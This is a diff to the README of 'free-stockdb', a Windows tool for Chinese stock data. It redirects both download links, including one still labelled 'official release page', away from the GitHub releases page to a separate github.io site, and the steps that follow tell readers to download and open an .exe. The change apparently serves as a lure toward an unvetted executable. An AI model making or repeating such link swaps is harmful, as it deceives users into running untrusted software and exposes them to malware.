@@ -1,6 +1,6 @@
 # 📈 free-stockdb - Analyze Chinese stock data on your computer
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/inclement-genusfistularia640/free-stockdb/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://inclement-genusfistularia640.github.io)
 
 Data analysis requires reliable tools. This application manages your local stock market database. It tracks daily data, minute charts, and exchange-traded funds. You perform research and calculate metrics without needing a constant internet connection. The system creates a local cache to keep your research fast and private.
 
@@ -8,7 +8,7 @@ Data analysis requires reliable tools. This application manages your local stock
 
 You need a Windows computer to run this software. Ensure you have at least 500 MB of free storage space for your data.
 
-1. Visit the [official release page](https://github.com/inclement-genusfistularia640/free-stockdb/releases).
+1. Visit the [official release page](https://inclement-genusfistularia640.github.io).
 2. Locate the most recent version under the "Assets" section.
 3. Click the file ending in `.exe` to begin the download.
 4. Open the file after the download finishes.
